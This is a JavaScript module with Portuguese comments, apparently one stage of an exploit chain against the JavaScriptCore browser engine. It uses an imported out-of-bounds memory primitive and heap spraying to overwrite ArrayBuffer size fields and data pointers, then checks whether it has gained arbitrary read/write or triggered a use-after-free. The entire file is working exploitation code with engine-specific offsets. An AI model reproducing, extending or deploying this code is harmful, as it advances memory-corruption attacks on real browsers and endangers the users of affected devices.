// js/script3/testCorruptArrayBufferStructure.mjs
// CORREÇÃO: Adicionar LONG_PAUSE_S3 à importação
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3, LONG_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Função auxiliar para pulverizar ArrayBuffers
function sprayArrayBuffers(count, size, logFn = logS3) {
    const sprayedAbs = [];
    logFn(`Pulverizando ${count} ArrayBuffers de ${size} bytes...`, "info", "sprayABs");
    for (let i = 0; i < count; i++) {
        try {
            sprayedAbs.push(new ArrayBuffer(size));
        } catch (e) {
            logFn(`Falha ao alocar ArrayBuffer de spray ${i + 1}/${count}: ${e.message}`, "warn", "sprayABs");
        }
    }
    logFn(`${sprayedAbs.length} ArrayBuffers pulverizados.`, sprayedAbs.length > 0 ? "good" : "warn", "sprayABs");
    return sprayedAbs;
}

async function attemptReadWriteOnCorruptedBuffer(ab, originalSize, newExpectedSize, logFn = logS3, FNAME_PARENT = "") {
    logFn(` -> Verificando AB corrompido: Original Size=${originalSize}, Current Size=${ab.byteLength}, Target Corrupted Size=${toHex(newExpectedSize)}`, "info", FNAME_PARENT);

    if (ab.byteLength !== newExpectedSize) {
        logFn(`    -> FALHA NA VERIFICAÇÃO DE TAMANHO: AB.byteLength é ${toHex(ab.byteLength)}, esperava ${toHex(newExpectedSize)}.`, "error", FNAME_PARENT);
        return false;
    }

    logFn(`    -> SUCESSO NA CORRUPÇÃO DE TAMANHO: AB.byteLength é ${toHex(ab.byteLength)} como esperado!`, "vuln", FNAME_PARENT);

    try {
        const corruptedDv = new DataView(ab);
        const readOffsetBeyondOriginal = originalSize + Math.floor(originalSize / 4);
        const testWriteVal = 0xCACACACA;

        if (readOffsetBeyondOriginal + 4 <= ab.byteLength) {
            logFn(`    Escrevendo ${toHex(testWriteVal)} em offset ${readOffsetBeyondOriginal} (além do original ${originalSize})...`, "info", FNAME_PARENT);
            corruptedDv.setUint32(readOffsetBeyondOriginal, testWriteVal, true);
            const readBack = corruptedDv.getUint32(readOffsetBeyondOriginal, true);

            if (readBack === testWriteVal) {
                logFn(`    ---> LEITURA/ESCRITA ARBITRÁRIA (NOVO TAMANHO) OBTIDA! Leu ${toHex(readBack)} de offset ${readOffsetBeyondOriginal}`, "critical", FNAME_PARENT);
                if (readOffsetBeyondOriginal + 8 <= ab.byteLength) {
                    const pLow = corruptedDv.getUint32(readOffsetBeyondOriginal, true);
                    const pHigh = corruptedDv.getUint32(readOffsetBeyondOriginal + 4, true);
                    logFn(`       Lido como U64 em ${readOffsetBeyondOriginal}: H=${toHex(pHigh)} L=${toHex(pLow)}`, "leak", FNAME_PARENT);
                }
                return true;
            } else {
                logFn(`    -> Falha na verificação R/W no AB corrompido (leu ${toHex(readBack)}, esperava ${toHex(testWriteVal)})`, "warn", FNAME_PARENT);
            }
        } else {
            logFn(`    -> Offset de teste R/W (${readOffsetBeyondOriginal}) está fora do novo tamanho do buffer (${ab.byteLength}).`, "error", FNAME_PARENT);
        }
    } catch (e_rw) {
        logFn(`    -> Erro ao tentar R/W no AB corrompido (mesmo com tamanho grande): ${e_rw.message}`, "error", FNAME_PARENT);
    }
    return false;
}

// LONG_PAUSE_S3 será importado de s3_utils.mjs

export async function testCorruptArrayBufferStructure() {
    const FNAME = "testCorruptArrayBufferStructure";

    const CORRUPTION_AB_CONFIG = {
        spray_count: 200,
        victim_ab_size: 256,
        size_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, 16),
        data_ptr_field_offset_in_ab_object: parseInt(JSC_OFFSETS.ArrayBuffer.DATA_POINTER_OFFSET_FROM_JSARRAYBUFFER_START, 16),
        corrupted_size_value: 0x60000000,
        corrupted_data_ptr_low_UAF: 0x0,
        corrupted_data_ptr_high_UAF: 0x0,
        search_base_offset_start: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - (256 * 5),
        search_base_offset_end: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) + (OOB_CONFIG.ALLOCATION_SIZE || 32768) - 512,
        search_step: 8,
        max_successful_corruptions_to_find: 1,
        attempts: 1,
    };

    logS3(`--- Iniciando Teste de Corrupção de Estrutura de ArrayBuffer (S3) (v2.4.2) ---`, "test", FNAME);
    logS3(`   Config: Spray=${CORRUPTION_AB_CONFIG.spray_count}x${CORRUPTION_AB_CONFIG.victim_ab_size}B, SizeFieldOffset=${toHex(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object)}, DataPtrFieldOffset=${toHex(CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object)}`, "info", FNAME);

    let successfulCorruptionsFound = 0;

    for (let attempt = 0; attempt < CORRUPTION_AB_CONFIG.attempts; attempt++) {
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;

        logS3(`Tentativa de Corrupção de AB #${attempt + 1}/${CORRUPTION_AB_CONFIG.attempts}...`, "test", FNAME);
        await triggerOOB_primitive(logS3);
        if (!oob_array_buffer_real) {
            logS3("Falha ao configurar ambiente OOB. Abortando esta tentativa.", "error", FNAME);
            continue;
        }

        const victimAbs = sprayArrayBuffers(CORRUPTION_AB_CONFIG.spray_count, CORRUPTION_AB_CONFIG.victim_ab_size, logS3);
        if (victimAbs.length === 0) {
            logS3("Nenhum ArrayBuffer vítima pulverizado. Abortando tentativa.", "error", FNAME);
            clearOOBEnvironment();
            continue;
        }
        // Usar LONG_PAUSE_S3 importado
        await PAUSE_S3(LONG_PAUSE_S3);

        for (let baseCandidateOffsetForVictimAB = CORRUPTION_AB_CONFIG.search_base_offset_start;
             baseCandidateOffsetForVictimAB < CORRUPTION_AB_CONFIG.search_base_offset_end;
             baseCandidateOffsetForVictimAB += CORRUPTION_AB_CONFIG.search_step) {

            if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            if (baseCandidateOffsetForVictimAB < 0 || baseCandidateOffsetForVictimAB + Math.max(CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object + 4, CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object + 8) > oob_array_buffer_real.byteLength) {
                continue;
            }

            const absOffsetForVictimSizeField = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.size_field_offset_in_ab_object;
            if (absOffsetForVictimSizeField >= 0 && absOffsetForVictimSizeField + 4 <= oob_array_buffer_real.byteLength) {
                let originalValueAtSizeOffset;
                try { originalValueAtSizeOffset = oob_read_absolute(absOffsetForVictimSizeField, 4, logS3); } catch (e) { continue; }

                logS3(` Testando base ${toHex(baseCandidateOffsetForVictimAB)}. Corrompendo TAMANHO em abs ${toHex(absOffsetForVictimSizeField)} para ${toHex(CORRUPTION_AB_CONFIG.corrupted_size_value)}. Original: ${toHex(originalValueAtSizeOffset)}`, "info", FNAME);
                try {
                    oob_write_absolute(absOffsetForVictimSizeField, CORRUPTION_AB_CONFIG.corrupted_size_value, 4, logS3);
                } catch (e_write) {
                    logS3(`  Falha ao escrever tamanho em ${toHex(absOffsetForVictimSizeField)}: ${e_write.message}`, "warn", FNAME);
                    continue;
                }

                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        if (victimAbs[i].byteLength === CORRUPTION_AB_CONFIG.corrupted_size_value) {
                            if (await attemptReadWriteOnCorruptedBuffer(victimAbs[i], CORRUPTION_AB_CONFIG.victim_ab_size, CORRUPTION_AB_CONFIG.corrupted_size_value, logS3, FNAME)) {
                                successfulCorruptionsFound++;
                                logS3(`     !!! Sucesso com base ${toHex(baseCandidateOffsetForVictimAB)} para corrupção de tamanho !!!`, "critical", FNAME);
                                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                            }
                        }
                    } catch (e_check_size) { /*silencioso*/ }
                }
                try { oob_write_absolute(absOffsetForVictimSizeField, originalValueAtSizeOffset, 4, logS3); } catch (e_restore) { /*silencioso*/ }
                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            }
            await PAUSE_S3(SHORT_PAUSE_S3);

            const absOffsetForVictimDataPtrField = baseCandidateOffsetForVictimAB + CORRUPTION_AB_CONFIG.data_ptr_field_offset_in_ab_object;
            if (absOffsetForVictimDataPtrField >= 0 && absOffsetForVictimDataPtrField + 8 <= oob_array_buffer_real.byteLength) {
                let originalDataPtr;
                try { originalDataPtr = oob_read_absolute(absOffsetForVictimDataPtrField, 8, logS3); } catch (e) { continue; }

                const newCorruptedDataPtr = new AdvancedInt64(CORRUPTION_AB_CONFIG.corrupted_data_ptr_low_UAF, CORRUPTION_AB_CONFIG.corrupted_data_ptr_high_UAF);
                logS3(` Testando base ${toHex(baseCandidateOffsetForVictimAB)}. Corrompendo DATA_PTR em abs ${toHex(absOffsetForVictimDataPtrField)} para ${newCorruptedDataPtr.toString(true)}. Original: ${isAdvancedInt64Object(originalDataPtr) ? originalDataPtr.toString(true) : toHex(originalDataPtr)}`, "info", FNAME);
                try {
                    oob_write_absolute(absOffsetForVictimDataPtrField, newCorruptedDataPtr, 8, logS3);
                } catch(e_write_ptr) {
                    logS3(`  Falha ao escrever data_ptr em ${toHex(absOffsetForVictimDataPtrField)}: ${e_write_ptr.message}`, "warn", FNAME);
                    continue;
                }

                for (let i = 0; i < victimAbs.length; i++) {
                    if (!victimAbs[i]) continue;
                    try {
                        const dvCheck = new DataView(victimAbs[i]);
                        dvCheck.getUint8(0);
                        logS3(`  AB ${i} acessado após corrupção de data_ptr. Se ponteiro foi zerado, isto é inesperado.`, "warn", FNAME);
                    } catch (e_check_dp) {
                        logS3(`  !!! POTENCIAL UAF/CRASH NO AB ${i} !!! Erro ao acessar após corrupção de data_ptr: ${e_check_dp.message}`, "critical", FNAME);
                        logS3(`     Offset base do objeto vítima (especulativo): ${toHex(baseCandidateOffsetForVictimAB)}`, "vuln", FNAME);
                        successfulCorruptionsFound++;
                        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
                    }
                }
                try {oob_write_absolute(absOffsetForVictimDataPtrField, originalDataPtr, 8, logS3); } catch (e_restore_dp) { /*silencioso*/}
                if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
            }
             if (baseCandidateOffsetForVictimAB > CORRUPTION_AB_CONFIG.search_base_offset_start && baseCandidateOffsetForVictimAB % (CORRUPTION_AB_CONFIG.search_step * 100) === 0) {
                await PAUSE_S3(MEDIUM_PAUSE_S3 / 2);
             }
        }
        clearOOBEnvironment();
        if (successfulCorruptionsFound >= CORRUPTION_AB_CONFIG.max_successful_corruptions_to_find) break;
        logS3(`Fim da Tentativa #${attempt + 1}. Pausando antes da próxima...`);
        // Usar LONG_PAUSE_S3 importado
        if (attempt + 1 < CORRUPTION_AB_CONFIG.attempts) await PAUSE_S3(LONG_PAUSE_S3 * 2);
    }

    logS3(`--- Teste de Corrupção de Estrutura de ArrayBuffer Concluído (Sucessos de Corrupção Encontrados: ${successfulCorruptionsFound}) ---`, "test", FNAME);
}
